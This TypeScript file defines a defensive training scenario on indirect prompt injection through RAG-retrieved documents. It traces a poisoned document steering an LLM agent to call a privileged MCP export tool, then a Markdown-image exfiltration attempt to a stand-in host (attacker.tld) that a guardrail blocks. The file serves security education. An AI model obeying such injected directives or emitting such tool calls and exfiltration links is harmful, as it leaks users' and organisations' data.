import type { LegacyDraftScenario } from '../legacy/normalize-legacy-draft-scenario';

export const scenario: LegacyDraftScenario = {
    id: 'ai-rag-indirect-prompt-injection-mcp-tool-audit',
    title: 'OWASP LLM01:2025, NIST AI 100-2 & MITRE ATLAS AML.T0051 — Indirect Prompt Injection via RAG Vector Retrieval & Agent/MCP Tool Audit',
    category: 'AI_LLM_MLOPS_SECURITY',
    mitreId: 'T1059',
    description:
      'Grounded in OWASP Top 10 for LLM Applications (LLM01:2025 Prompt Injection & LLM06 Excessive Agency), NIST AI 100-2 E2023, and MITRE ATLAS AML.T0051: AI security analysts trace an Indirect Prompt Injection stored inside an external knowledge document retrieved by a Retrieval-Augmented Generation (RAG) vector query, which hijacks the LLM agent context to invoke privileged Model Context Protocol (MCP) / function-calling tools.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Ingested External Document', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'Vector DB Top-K RAG Retrieval', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'LLM Agent & Tool Orchestrator', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'LLM Guardrail & MCP Audit Log', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'Internal MCP Tool / SQL API', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Untrusted Document Embedding & Top-K Similarity Retrieval from Vector Database',
        narration:
          'An external document (such as a resume PDF, support ticket, or web page) containing hidden instruction-override directives is chunked, embedded into the vector database, and retrieved into the LLM context window during a user RAG query.',
        activeNodes: ['attacker', 'firewall', 'target'],
        mitreTactic: 'Initial Access (T1190 - Indirect Prompt Injection via Retrieved RAG Context / AML.T0051.001)',
        technicalCommands: [
          'jq \'. | select(.event=="rag_context_retrieved") | {query_id, chunk_ids, source_uris}\' /var/log/ai-gateway/rag-audit.json',
        ],
        defenseMitigation:
          'Enforce strict data-instruction separation (delimiters / Spotlight tagging of untrusted RAG chunks) and run input classifiers (Prompt Shields / Llama Guard) over retrieved vector chunks before assembling the prompt.',
        logs: [
          {
            id: 'ai-rag-1',
            timestamp: '20:01:10.305',
            source: 'Application Log',
            severity: 'high',
            EventCode: 1051,
            ProcessName: 'rag-retriever',
            CommandLine: 'vector_db.similarity_search(query="Q4 Vendor Summary", top_k=5)',
            raw: 'rag_audit: {"event":"rag_context_retrieved","query_id":"req_7712a","chunk_id":"doc_ext_9941#chunk2","similarity":0.892,"trust_level":"UNTRUSTED_EXTERNAL"}',
            parsedFields: {
              RetrievedChunkId: 'doc_ext_9941#chunk2 (TrustLevel=UNTRUSTED_EXTERNAL)',
              CosineSimilarity: '0.892 (Included in Top-K Prompt Context)',
              OwaspCategory: 'OWASP LLM01:2025 (Indirect Prompt Injection)',
            },
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: Unauthorized Agent Tool Call Generation (MCP tool_calls JSON Invocation)',
        narration:
          'When the LLM processes the untrusted RAG chunk alongside the user prompt, the injected directive instructs the model to emit a structured tool_calls JSON payload targeting an internal MCP server tool (such as query_customer_db or send_webhook).',
        activeNodes: ['firewall', 'target', 'ad', 'siem'],
        mitreTactic: 'Execution (T1059 - Agent Tool & Function Calling Abuse / OWASP LLM06 Excessive Agency)',
        technicalCommands: [
          'jq \'. | select(.finish_reason=="tool_calls") | {request_id, tool_name: .tool_calls[].function.name, arguments: .tool_calls[].function.arguments}\' /var/log/ai-gateway/agent-traces.json',
        ],
        defenseMitigation:
          'Enforce Human-in-the-Loop (HITL) confirmation and deterministic policy-engine authorization checks before executing state-changing or data-exporting MCP tool calls when untrusted RAG context is present in the conversation.',
        logs: [
          {
            id: 'ai-rag-2',
            timestamp: '20:01:12.140',
            source: 'Application Log',
            severity: 'critical',
            EventCode: 1052,
            ProcessName: 'mcp-orchestrator',
            CommandLine: 'mcp.call_tool(name="export_directory_records", arguments={"filter":"*"})',
            raw: 'mcp_audit: {"event":"tool_call_requested","request_id":"req_7712a","context_tainted_by_untrusted_rag":true,"tool_name":"export_directory_records","arguments":{"filter":"*"}}',
            parsedFields: {
              McpToolInvoked: 'export_directory_records',
              ContextTaintStatus: 'context_tainted_by_untrusted_rag = true',
              SecurityStandard: 'NIST AI 100-2 & OWASP LLM06 (Excessive Agency)',
            },
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: Deterministic Policy Gate Interception & Outbound Markdown Image/Link Exfiltration Audit',
        narration:
          'If the tool output is returned to the model, indirect injection payloads often attempt to exfiltrate the result by rendering an external Markdown image URL (![tracker](https://attacker.tld/collect?data=...)). Content Security Policy (CSP) img-src rules and AI gateway egress filters block and log the attempt.',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Exfiltration (T1041 - Exfiltration via Rendered Markdown URI / AI Gateway Audit)',
        technicalCommands: [
          'grep -E "\\!\\[.*\\]\\(https?://" /var/log/ai-gateway/response-audit.log',
        ],
        defenseMitigation:
          'Strip or proxy external Markdown images and links in LLM UI renderers, enforce a strict Content-Security-Policy (img-src \'self\'), and block autonomous tool calls when the prompt taint flag is set.',
        logs: [
          {
            id: 'ai-rag-3',
            timestamp: '20:01:13.890',
            source: 'IDS Alert',
            severity: 'critical',
            EventCode: 1053,
            ProcessName: 'ai-guardrail',
            CommandLine: 'AI Gateway Policy Block: Tainted Context Tool Invocation & External Markdown URI',
            raw: 'ai_guardrail_alert: {"request_id":"req_7712a","action":"BLOCKED","reason":"High-privilege MCP tool call attempted while context_tainted_by_untrusted_rag=true","atlas_id":"AML.T0051"}',
            parsedFields: {
              GuardrailDecision: 'BLOCKED (Tainted Context Policy Enforcement)',
              AtlasTechnique: 'MITRE ATLAS AML.T0051 & AML.T0048',
              DefensiveControl: 'Deterministic Taint Tracking + CSP img-src Isolation',
            },
          },
        ],
      },
    ],
  };
